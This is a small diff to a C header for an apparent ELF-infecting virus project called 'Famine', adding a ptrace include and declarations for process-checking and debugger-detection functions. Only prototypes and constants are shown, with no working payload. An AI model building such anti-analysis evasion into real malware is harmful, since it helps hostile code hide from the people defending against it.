@@ -9,11 +9,13 @@
 # include <sys/mman.h>
 # include <sys/stat.h>
 # include <sys/types.h>
+# include <sys/ptrace.h>
 # include <fcntl.h>
 # include <elf.h>
 # include <dirent.h>
 
-#define signature "Famine version 1.0 (c)oded feb-2021 by gdelabro"
+# define PROC_SIZE_MAX 64
+# define signature	"Famine version 1.0 (c)oded feb-2021 by gdelabro"
 
 typedef struct s_famine
 {
@@ -21,6 +23,8 @@ typedef struct s_famine
 	Elf64_Phdr	*data;
 }			t_famine;
 
+void	check_proc(void);
+void	check_debugger(void);
 
 void	init_check_address(void *ptr, int size);
 int		is_in_address(void *ptr);
